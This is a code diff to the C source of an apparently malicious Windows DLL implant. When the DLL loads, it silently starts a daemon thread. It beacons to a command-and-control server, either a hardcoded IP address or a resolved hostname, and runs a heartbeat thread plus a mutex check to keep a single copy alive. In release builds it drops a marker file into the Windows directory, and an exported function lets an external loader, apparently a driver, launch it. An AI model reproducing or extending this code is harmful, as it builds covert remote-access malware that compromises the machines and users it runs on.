@@ -1,4 +1,5 @@
 #include "funcs.h"
+#include "Ws2tcpip.h"
 
 DWORD WINAPI BindThread( LPVOID lpParam ) {    
   WSADATA WSAData;
@@ -211,7 +212,7 @@ void GetCCInfo( char* address ) {
     WSACleanup( ) ;
     return 1 ;
   } // end of if( INVALID_SOCKET == ConnectSocket )
-#if 1
+#if 0
   goto ___ ;
 #endif
   remoteHost = gethostbyname( HOSTNAME ) ;
@@ -230,12 +231,12 @@ void GetCCInfo( char* address ) {
       PRINTF( "[-] remoteHost->h_addrtype == AF_INET" ) ;
     }
   }
-#if 1
+#if 0
 ___:
 #endif
   clientService.sin_family = AF_INET ;
-  /* clientService.sin_addr.s_addr = addr.s_addr ; */
-  inet_pton( AF_INET,"101.201.170.152",&(clientService.sin_addr));
+  clientService.sin_addr.s_addr = addr.s_addr ;
+  /* inet_pton( AF_INET,"101.201.170.152",&(clientService.sin_addr)); */
   clientService.sin_port = htons( DEFAULT_PORT ) ;
   iResult = connect( 
     ConnectSocket , 
@@ -362,16 +363,12 @@ DWORD WINAPI DaemonThread( LPVOID lpParam ) {
     NULL ,
     0 ,
     HeartBeatThread ,
-    NULL ,
+    lpParam ,
     0 ,
     &dwHeartBeatThreadId
     ) ;
   WaitForSingleObject( hHeartBeatThread , 1 ) ;
   CloseHandle( hHeartBeatThread ) ;
-#else
-  HANDLE hMutex = CreateMutex( NULL , FALSE , "XJJ" ) ;
-  CloseHandle( hMutex ) ;
-  PRINTF( "[+] before loop\n" ) ;
 #endif
   for( ; ; ) {
     if( CheckLocalTime( ) ) {
@@ -410,34 +407,25 @@ DWORD WINAPI DaemonThread( LPVOID lpParam ) {
 
 #ifdef HEART_BEAT_WRITE_MEMORY
 DWORD WINAPI HeartBeatThread( LPVOID lpParam ) {
-  long* p_timeStamp = HEART_BEAT_ADDRESS ;
-  long timeStamp_new ;
+  ULONGLONG* p_timeStamp = *(long*)lpParam ;
+  ULONGLONG timeStamp_new ;
   DWORD dwPID , dwTID ;
   HANDLE hProcess ;
+  DWORD oldProtect = 0 ;
+  int rc = -44 ;
   dwPID = GetCurrentProcessId( ) ;
   dwTID = GetCurrentThreadId( ) ;
   hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
   for( ; ; ) {
     PRINTF( "[%d] heart beating timeStamp %d\r\n" , dwTID , *p_timeStamp ) ;
     timeStamp_new = *p_timeStamp ;
-    /* timeStamp_new = */
-    /*   timeStamp_new % 2 ? */
-    /*   -- timeStamp_new : */
-    /*   ++ timeStamp_new */
-    /*   ; */
     if( 0 < timeStamp_new && timeStamp_new <= 4444 ) { /* inside range [1,4444] */
       timeStamp_new ++ ;
     }
     else {                      /* outside the range [1,4444], set to 1 */
       timeStamp_new = 1 ;
     }
-    WriteProcessMemory( 
-      hProcess , 
-      ( LPVOID )p_timeStamp ,
-      ( LPVOID )&timeStamp_new ,
-      sizeof( timeStamp_new ) ,
-      NULL 
-      ) ;
+    memcpy( p_timeStamp , &timeStamp_new , sizeof( timeStamp_new ) ) ; // 用WriteProcessMemory写入sys申请的内存会失败
     Sleep( HEART_BEAT_SPLIT * 1000 ) ;
   }
 }
@@ -464,9 +452,13 @@ BOOL CheckHeartBeat( ) {
 #else
   HANDLE hMutex = CreateMutex( NULL , FALSE , "XJJ" ) ;
   if( GetLastError( ) == ERROR_ALREADY_EXISTS ) {
-    CloseHandle( hMutex ) ;
     rc = TRUE ; // beating
     PRINTF( "[+] mutex XJJ exist\n" ) ;
+    CloseHandle( hMutex ) ;
+  }
+  else {
+    rc = FALSE ; // not beating
+    PRINTF( "[+] mutex XJJ not exist\n" ) ;
   }
 #endif
   return rc ;
@@ -481,22 +473,49 @@ BOOL WINAPI DllMain(
   HANDLE hDaemonThread ;
   switch( fdwReason ) {
   case DLL_PROCESS_ATTACH :
-    PRINTF("dllmain called\n");
-    hDaemonThread = CreateThread(
-      NULL ,
-      0 ,
-      DaemonThread ,
-      NULL ,
-      0 ,
-      &dwDaemonThreadId
-      ) ;
-    WaitForSingleObject( hDaemonThread , 1 ) ;
-    CloseHandle( hDaemonThread ) ;
-    break ;
+    if( !CheckHeartBeat( ) ) {
+#ifdef _RELEASE_
+      FILE* f_h ;
+      f_h = fopen( "c:\\windows\\_" , "w" ) ;   
+      fprintf( f_h , "\xde\xad\xbe\xef" ) ;
+      fclose( f_h ) ;
+#endif
+      hDaemonThread = CreateThread(
+        NULL ,
+        0 ,
+        DaemonThread ,
+        NULL ,
+        0 ,
+        &dwDaemonThreadId
+        ) ;
+      WaitForSingleObject( hDaemonThread , 1 ) ;
+      CloseHandle( hDaemonThread ) ;
+    }
+    return TRUE ;
   case DLL_PROCESS_DETACH :
   case DLL_THREAD_ATTACH :
   case DLL_THREAD_DETACH :
     break ;
   } // end of switch( fdwReason )
   return TRUE ;
+}
+
+void x( void* data ) {
+  DWORD dwDaemonThreadId ;
+  HANDLE hDaemonThread ;
+  /* ULONGLONG* addr ; */
+  /* addr = ( ULONGLONG* )data ; */
+  /* PRINTF( "%x\n" , *addr ) ; */
+  /* PRINTF( "[+] wassup x called\n" ) ; */
+  /* PRINTF( "[+][+] x HEART BEAT ADDRESS %p\n" , *(ULONGLONG*)data ) ; */
+  hDaemonThread = CreateThread(
+    NULL ,
+    0 ,
+    DaemonThread ,
+    data ,
+    0 ,
+    &dwDaemonThreadId
+    ) ;
+  WaitForSingleObject( hDaemonThread , 1 ) ;
+  CloseHandle( hDaemonThread ) ;
 }
